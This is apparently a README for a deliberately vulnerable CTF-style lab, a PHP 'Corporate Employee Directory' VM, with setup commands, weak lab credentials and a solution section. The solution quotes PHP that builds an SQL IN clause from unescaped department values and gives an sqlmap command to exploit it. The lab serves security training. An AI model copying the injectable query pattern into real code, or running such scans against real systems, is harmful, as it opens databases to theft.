# PHP SQL injection 2 Attack (Contactbook)

Download VM:
* Credentials: ```user/user```, ```root/123456```
* SSH disabled
* Debian 11, 2 GB disk

# Agenda

In this lab, we will try to find out how well the new Corporate Employee Directory security has been implemented.


# Setup

*Requirements:*  **2 GB** of disk space for VM.

Put all files in **source** to folder **/var/www/html/**


```bash
sudo apt-get update --allow-releaseinfo-change
sudo apt-get install nginx mariadb-server php-fpm php-mysql sudo unzip

sudo chown www-data:www-data -R /var/www/html/
sudo chmod 755 -R /var/www/html/*
```

#### Manual database set up

```bash
sudo mysql -e "UPDATE mysql.user SET Password = PASSWORD('12345') WHERE User = 'root'"
sudo mysql -e "DELETE FROM mysql.user WHERE User='';"
sudo mysql -e "DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');"
sudo mysql -e "DROP DATABASE IF EXISTS test;"
sudo mysql -e "DELETE FROM mysql.db WHERE Db='test' OR Db='test\\_%';"
sudo mysql -e "create database contactbook";
sudo mysql -e "CREATE USER 'admin'@'localhost' IDENTIFIED BY 'admin'";
sudo mysql -e "GRANT ALL PRIVILEGES ON contactbook . * TO 'admin'@'localhost'";
sudo mysql -e "FLUSH PRIVILEGES";

sudo mysql contactbook < /var/www/html/db.sql
sudo rm -f /var/www/html/db.sql

```



#### Set up a flag

```
sudo mysql -e "insert into contactbook.flag(\`id\`) values ('SQL_Injection_Contact');";
```


#### Nginx configure

Change **/etc/nginx/sites-enabled/default** (php-fpm version may be different):

```
server {
        listen 80 default_server;
        listen [::]:80 default_server;

        root /var/www/html;
        index index.php;
        server_name _;

        location / {
                try_files $uri $uri/ =404;
        }
        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }

}
```

Reload nginx config
```
sudo service nginx restart
#sudo systemctl restart nginx
```


## How to check that everything works ?

1. Open the main page. You should see the working app. 


## Solution

There is SQL injection

```php

if (isset($_POST['search']) && strlen($_POST['search'])>3)
{
	$search=$mysqli->real_escape_string(trim($_POST['search']));
    $query = "SELECT * FROM employees where (`name` like '%".$search."%' or `surname` like '%".$search."%')";
	
	if(isset($_POST['department']))
	{
		
		if(count($_POST['department'])>0)
		{
			$where=" AND `department` in (";
			foreach($_POST['department'] as $dep)
			{
				$where.="'".$dep."',"; //--- injection here
			}
			$where=substr($where, 0, -1);
			$where.=")";
			$query.=$where;
		}
	}
}

```

Exploit it with SQLMAP:

```
sqlmap --url IP --data="search=William&department%5B%5D=Network&department%5B%5D=Telephony" 
```






